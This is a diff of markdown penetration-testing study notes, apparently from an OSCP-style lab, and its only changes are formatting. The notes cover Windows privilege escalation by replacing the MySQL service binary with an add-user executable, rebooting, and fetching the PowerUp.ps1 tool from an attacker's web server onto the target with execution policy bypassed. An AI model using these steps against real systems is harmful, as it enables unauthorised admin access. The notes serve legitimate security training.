@@ -1174,29 +1174,29 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
     move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
     ```
-  - restart the service to execute the binary > access denied
+  - restart the service to execute the binary > access denied  
     `net stop mysql`
-  - another approach, check the startup type > Auto
+  - another approach, check the startup type > Auto  
     `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}`
-  - check the privilege "SeShutDownPrivilege" for reboot privilege 
+  - check the privilege "SeShutDownPrivilege" for reboot privilege  
     `whoami /priv`
-  - reboot machine
+  - reboot machine  
     `shutdown /r /t 0`
-  - connect again as dave via RDP and open a PowerShell window. new user 'dave2' created.
-    `Get-LocalGroupMember administrators`
-  - Copy PowerUp.ps1 to kali's home directory and serve it with a Python3 web server
-    `cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .`
+  - connect again as dave via RDP and open a PowerShell window. new user 'dave2' created.  
+    `Get-LocalGroupMember administrators`  
+  - Copy PowerUp.ps1 to kali's home directory and serve it with a Python3 web server  
+    `cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .`  
     `python3 -m http.server 80`  
-  - On target machine, download the PowerUp.ps1 and displays services the current user can modify > identified mysql (among others) to be vulnerable
+  - On target machine, download the PowerUp.ps1 and displays services the current user can modify > identified mysql (among others) to be vulnerable  
     ```
     iwr -uri http://<KALI>/PowerUp.ps1 -Outfile PowerUp.ps1 //PowerShell post-exploitation tool used primarily for Windows privilege escalation
     powershell -ep bypass
     . .\PowerUp.ps1
     Get-ModifiableServiceFile
     ```
-  - Error of "AbuseFunction" to replace binary file
+  - Error of "AbuseFunction" to replace binary file  
     `Install-ServiceBinary -Name 'mysql'` //mysql' for service mysql not modifiable by the current user
-  - Listing 55 - Analyzing the function ModifiablePath    
+  - Listing 55 - Analyzing the function ModifiablePath      
 - DLL hijacking
 - Unquoted Service Paths
 - Scheduled Tasks
